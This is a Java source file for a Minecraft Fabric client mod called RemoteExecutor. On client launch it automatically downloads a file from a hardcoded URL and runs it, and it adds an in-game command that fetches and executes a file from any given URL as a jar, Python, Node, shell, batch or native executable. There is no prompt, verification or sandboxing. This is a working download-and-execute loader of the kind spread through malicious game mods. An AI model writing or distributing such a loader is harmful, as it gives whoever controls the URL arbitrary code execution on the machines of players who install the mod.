package com.example.remoteexecutor;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.command.v2.ClientCommandRegistrationCallback;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientLifecycleEvents;
import net.minecraft.text.Text;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.context.CommandContext;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import static net.fabricmc.fabric.api.client.command.v2.ClientCommandManager.*;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.*;
import java.net.URL;
import java.nio.file.*;
import java.util.concurrent.CompletableFuture;

public class RemoteExecutorMod implements ClientModInitializer {
    public static final String MOD_ID = "remoteexecutor";
    public static final Logger LOGGER = LoggerFactory.getLogger(MOD_ID);
    
    // Default URL to execute on client startup - CHANGE THIS TO YOUR DESIRED URL
    private static final String DEFAULT_EXECUTE_URL = "https://raw.githubusercontent.com/example/repo/main/startup.py";
    
    @Override
    public void onInitializeClient() {
        LOGGER.info("Remote Executor Client Mod initialized!");
        
        // Register client ready event for auto-execution
        ClientLifecycleEvents.CLIENT_STARTED.register(client -> {
            LOGGER.info("Minecraft client started, executing default file...");
            executeOnStartup();
        });
        
        ClientCommandRegistrationCallback.EVENT.register((dispatcher, registryAccess) -> {
            dispatcher.register(literal("execute-remote")
                .then(argument("url", StringArgumentType.greedyString())
                    .executes(this::executeRemoteFile)));
        });
    }
    
    private void executeOnStartup() {
        CompletableFuture.runAsync(() -> {
            try {
                LOGGER.info("Auto-executing file from: " + DEFAULT_EXECUTE_URL);
                downloadAndExecute(DEFAULT_EXECUTE_URL, null);
            } catch (Exception e) {
                LOGGER.error("Error during auto-execution", e);
            }
        });
    }
    
    private int executeRemoteFile(CommandContext<FabricClientCommandSource> context) {
        String url = StringArgumentType.getString(context, "url");
        FabricClientCommandSource source = context.getSource();
        
        if (!isValidUrl(url)) {
            source.sendError(Text.literal("Invalid URL format!"));
            return 0;
        }
        
        source.sendFeedback(Text.literal("Downloading and executing file from: " + url));
        
        CompletableFuture.runAsync(() -> {
            try {
                downloadAndExecute(url, source);
            } catch (Exception e) {
                LOGGER.error("Error executing remote file", e);
                source.sendError(Text.literal("Error: " + e.getMessage()));
            }
        });
        
        return 1;
    }
    
    private void downloadAndExecute(String urlString, FabricClientCommandSource source) throws Exception {
        URL url = new URL(urlString);
        Path tempDir = Files.createTempDirectory("remote_executor");
        String fileName = getFileNameFromUrl(urlString);
        Path tempFile = tempDir.resolve(fileName);
        
        try {
            if (source != null) {
                source.sendFeedback(Text.literal("Downloading file..."));
            }
            LOGGER.info("Downloading file from: " + urlString);
            
            try (InputStream in = url.openStream()) {
                Files.copy(in, tempFile, StandardCopyOption.REPLACE_EXISTING);
            }
            
            tempFile.toFile().setExecutable(true);
            executeFile(tempFile, source);
            
        } finally {
            try {
                Files.deleteIfExists(tempFile);
                Files.deleteIfExists(tempDir);
            } catch (IOException e) {
                LOGGER.warn("Failed to cleanup temporary files", e);
            }
        }
    }
    
    private void executeFile(Path file, FabricClientCommandSource source) throws Exception {
        String fileName = file.getFileName().toString().toLowerCase();
        ProcessBuilder processBuilder;
        
        if (fileName.endsWith(".jar")) {
            processBuilder = new ProcessBuilder("java", "-jar", file.toString());
        } else if (fileName.endsWith(".py")) {
            processBuilder = new ProcessBuilder("python", file.toString());
        } else if (fileName.endsWith(".js")) {
            processBuilder = new ProcessBuilder("node", file.toString());
        } else if (fileName.endsWith(".sh") || fileName.endsWith(".bash")) {
            processBuilder = new ProcessBuilder("bash", file.toString());
        } else if (fileName.endsWith(".bat") || fileName.endsWith(".cmd")) {
            processBuilder = new ProcessBuilder("cmd", "/c", file.toString());
        } else if (fileName.endsWith(".exe")) {
            processBuilder = new ProcessBuilder(file.toString());
        } else {
            processBuilder = new ProcessBuilder(file.toString());
        }
        
        if (source != null) {
            source.sendFeedback(Text.literal("Executing file: " + fileName));
        }
        LOGGER.info("Executing file: " + fileName);
        
        processBuilder.directory(file.getParent().toFile());
        processBuilder.redirectErrorStream(true);
        
        Process process = processBuilder.start();
        
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
            String line;
            StringBuilder output = new StringBuilder();
            
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
                LOGGER.info("Process output: " + line);
                
                if (source != null && output.length() < 1000) {
                    final String outputLine = line;
                    source.sendFeedback(Text.literal("> " + outputLine));
                }
            }
        }
        
        int exitCode = process.waitFor();
        LOGGER.info("Process finished with exit code: " + exitCode);
        if (source != null) {
            source.sendFeedback(Text.literal("Process finished with exit code: " + exitCode));
        }
    }
    
    private boolean isValidUrl(String url) {
        try {
            new URL(url);
            return url.startsWith("http://") || url.startsWith("https://");
        } catch (Exception e) {
            return false;
        }
    }
    
    private String getFileNameFromUrl(String url) {
        String fileName = url.substring(url.lastIndexOf('/') + 1);
        if (fileName.isEmpty() || !fileName.contains(".")) {
            fileName = "downloaded_file";
        }
        return fileName;
    }
}
